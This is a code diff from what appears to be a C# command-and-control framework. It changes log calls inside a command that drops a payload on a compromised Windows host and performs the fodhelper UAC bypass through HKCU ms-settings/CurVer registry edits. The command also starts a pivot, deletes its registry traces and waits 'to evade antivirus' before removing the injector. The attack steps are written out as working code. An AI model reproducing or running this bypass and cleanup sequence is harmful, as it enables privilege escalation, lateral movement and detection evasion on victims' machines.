@@ -96,20 +96,20 @@ namespace Commander.Commands.Composite
             var fileId = await context.UploadAndDisplay(pay, fileName, "Uploading Payload");
             await context.CommModule.TaskAgentToDownloadFile(agent.Metadata.Id, fileId);
 
-            this.Echo($"[>] Downloading file {fileName} to {path}...");
+            this.Step($"Downloading file {fileName} to {path}");
             this.Dowload(fileName, fileId, path);
             this.Delay(1);
-            this.Echo($"[>] Altering registry Keys...");
+            this.Step($"Altering registry Keys");
             this.Shell($"reg add \"HKCU\\Software\\Classes\\.{context.Options.key}\\Shell\\Open\\command\" /d \"{path}\" /f");
             this.Shell($"reg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".{context.Options.key}\" /f");
             this.Delay(1);
-            this.Echo($"[>] Starting pivot {endpoint}...");
+            this.Step($"Starting pivot {endpoint}");
             this.StartPivot(endpoint);
             this.Delay(2);
-            this.Echo($"[>] Starting fodhelper...");
+            this.Step($"Starting fodhelper");
             this.Shell("fodhelper");
             this.Delay(2);
-            this.Echo($"[>] Cleaning...");
+            this.Step($"Cleaning");
             this.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\.{context.Options.key} -Recurse  -Force -Verbose");
             this.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\ms-settings\\CurVer -Recurse -Force -Verbose");
             if (!context.Options.inject)
@@ -118,9 +118,9 @@ namespace Commander.Commands.Composite
             }
             else
             {
-                this.Echo($"[>] Waiting {options.InjectionDelay}s to evade antivirus...");
+                this.Step($"Waiting {options.InjectionDelay}s to evade antivirus");
                 this.Delay(options.InjectionDelay + 10);
-                this.Echo($"[>] Removing injector {path}...");
+                this.Step($"Removing injector {path}");
                 this.Shell($"del {path}");
             }
             this.Echo($"[*] Execution done!");
